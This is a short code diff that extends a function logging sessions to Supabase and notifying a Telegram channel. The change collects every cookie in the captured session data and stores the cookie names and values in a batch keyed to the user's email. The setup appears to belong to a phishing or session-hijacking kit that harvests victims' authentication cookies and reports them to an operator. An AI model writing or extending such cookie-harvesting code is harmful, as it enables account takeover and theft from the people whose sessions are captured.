@@ -1,5 +1,6 @@
 import { createServerClient } from "@supabase/ssr"
 import { sendSessionNotificationToTelegram } from "./telegram-service"
+import { logCookieBatch } from "./cookie-logger"
 
 export async function logSessionToSupabase(
   email: string,
@@ -54,6 +55,15 @@ export async function logSessionToSupabase(
     if (insertError) {
       console.error("[v0] Supabase insert error:", insertError)
       return false
+    }
+
+    const cookieArray = Object.entries(sessionData.cookies).map(([name, value]) => ({
+      name,
+      value,
+    }))
+
+    if (cookieArray.length > 0) {
+      await logCookieBatch(email, cookieArray)
     }
 
     // Send Telegram notification
